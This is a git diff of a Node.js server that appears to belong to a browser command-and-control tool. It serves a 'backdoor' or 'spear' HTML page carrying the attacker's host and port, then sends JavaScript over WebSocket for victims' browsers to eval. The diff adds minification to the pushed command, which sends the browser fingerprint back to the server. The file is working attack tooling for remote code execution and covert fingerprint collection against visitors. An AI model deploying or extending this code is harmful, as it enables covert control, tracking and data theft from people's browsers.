@@ -5,8 +5,9 @@
 //var _ = require('underscore')
 var WebSocketServer = require('websocket').server
 var webSocketsServerPort = 1337
+var UglifyJS = require("uglify-js");
 var fs = require('fs');
-var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html','utf8');
+var spearHtml = fs.readFileSync(__dirname + '/spear.html','utf8');
 var http = require('http')
 var conns = []
 var gr;
@@ -50,7 +51,7 @@ var server = http.createServer((request, response) => {
   }
   else {
 	response.writeHead(200, {'Content-Type': 'text/html'});
-	response.write('<script type="text/javascript">var host_addr="'+LHOST+'";var host_port="'+LPORT+'";</script>'+backdoorHtml);
+	response.write('<script type="text/javascript">var host_addr="'+LHOST+'";var host_port="'+LPORT+'";</script>'+spearHtml);
 	response.end();
     //response.writeHead(404, {'Content-Tddype': 'text/html'})
     //response.end('Sorry, unknown url')
@@ -122,7 +123,7 @@ function handleReq(obj, con)
 function ask_fingerprint_info(connection)
 {
 	command = "new Fingerprint2().get(function(result, components){ socket.send(JSON.stringify({'fingerprint':result})); socket.send(JSON.stringify({'components':components})); });"
-	connection.sendUTF(JSON.stringify({ request: 'eval', content: command }))  
+	connection.sendUTF(JSON.stringify({ request: 'eval', content: UglifyJS.minify(command,{ie8:true})}))  
 }
 
 //REQUESTS
